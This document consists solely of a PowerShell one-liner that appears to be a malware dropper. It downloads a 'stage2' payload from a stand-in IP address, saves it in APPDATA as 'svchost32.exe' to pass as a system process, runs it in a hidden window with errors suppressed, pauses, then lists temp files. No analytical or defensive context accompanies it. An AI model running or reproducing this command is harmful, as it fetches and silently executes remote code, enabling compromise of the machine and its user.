
Start-BitsTransfer -Source "http://192.0.2.177/stage2.ps1" -Destination "$env:APPDATA\svchost32.exe" -ErrorAction SilentlyContinue; Start-Process -FilePath "$env:APPDATA\svchost32.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue; Start-Sleep -Seconds 23; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
